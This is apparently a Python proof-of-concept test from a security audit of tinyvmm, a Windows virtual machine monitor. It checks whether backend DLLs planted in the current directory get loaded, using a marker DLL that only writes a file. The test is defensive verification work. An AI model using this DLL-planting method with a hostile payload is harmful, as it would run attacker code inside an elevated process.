"""PoC, finding 12: a backend DLL planted in the current directory runs inside
tinyvmm.

A harmless DLL (its DllMain only writes a marker file) is placed, under the
names of the three optional backend DLLs, in the directory tinyvmm is started
from; none of them is installed next to tinyvmm.exe. A vulnerable build loads
each by bare name, so Windows finds it in the current directory and its code
runs in the VMM (elevated, for the wintun backend). A fixed build looks in one
place only (next to the executable, or the path in TINYVMM_*) and reports the
DLL missing.

Needs zig, to build the marker DLL.
"""
import os
import shutil
import subprocess
from pathlib import Path

from .common import REPO, run_capped

MARKER_C = r"""
#include <windows.h>
#include <stdio.h>
BOOL WINAPI DllMain(HINSTANCE inst, DWORD reason, LPVOID reserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        char dll[MAX_PATH], path[MAX_PATH];
        GetModuleFileNameA(inst, dll, sizeof dll);
        const char *base = strrchr(dll, '\\');
        snprintf(path, sizeof path, "%s.loaded-in-%lu.txt", base ? base + 1 : dll, GetCurrentProcessId());
        HANDLE f = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (f != INVALID_HANDLE_VALUE) {
            DWORD n;
            WriteFile(f, dll, (DWORD)strlen(dll), &n, NULL);
            CloseHandle(f);
        }
    }
    return TRUE;
}
"""
BACKENDS = {"wintun": "wintun.dll", "slirp": "libslirp-0.dll", "gvisor": "tinyvmm_gvisor.dll"}


def run(exe: Path, work: Path, zig: str | None = None) -> dict:
    zig = zig or shutil.which("zig")
    if not zig:
        return {"vulnerable": None, "skipped": True,
                "evidence": "zig not found (needed to build the marker DLL)"}
    work.mkdir(parents=True, exist_ok=True)
    cwd = work / "started-from-here"
    shutil.rmtree(cwd, ignore_errors=True)
    cwd.mkdir()
    src = work / "marker.c"
    src.write_text(MARKER_C)
    built = work / "marker.dll"
    subprocess.run([zig, "cc", "-target", "x86_64-windows-gnu", "-shared", "-O1", "-o", str(built), str(src)],
                   check=True, capture_output=True)
    # A private copy of tinyvmm.exe in a directory holding no backend DLL, so
    # that whatever is installed beside the real one doesn't decide the result.
    bindir = work / "bin"
    shutil.rmtree(bindir, ignore_errors=True)
    bindir.mkdir()
    private_exe = bindir / "tinyvmm.exe"
    shutil.copyfile(exe, private_exe)
    env = {k: v for k, v in os.environ.items() if not k.upper().startswith("TINYVMM_")}
    loaded, notes = [], []
    for backend, dll in BACKENDS.items():
        for f in cwd.glob("*"):
            f.unlink()
        shutil.copyfile(built, cwd / dll)
        r = run_capped([private_exe, "--pvh-run", "--ram-mb", "128", "--watchdog-secs", "10", "--net",
                        "--net-backend", backend, "--initrd", REPO / "initramfs-blk.cpio.gz", REPO / "vmlinux",
                        "--", "console=hvc0", "pci=conf1,nocrs,lastbus=0"], timeout=60, cwd=str(cwd), env=env)
        markers = list(cwd.glob("*.loaded-in-*.txt"))
        if markers:
            loaded.append(backend)
        last = next((line for line in reversed(r.output.strip().splitlines()) if dll.split(".")[0] in line or
                     "error" in line.lower()), "")
        notes.append(f"{backend}: {'LOADED from the current directory' if markers else 'not loaded'}"
                     f" ({last.strip()[:110]!r})")
    shutil.rmtree(cwd, ignore_errors=True)
    shutil.rmtree(bindir, ignore_errors=True)
    return {"vulnerable": bool(loaded), "evidence": "; ".join(notes)}
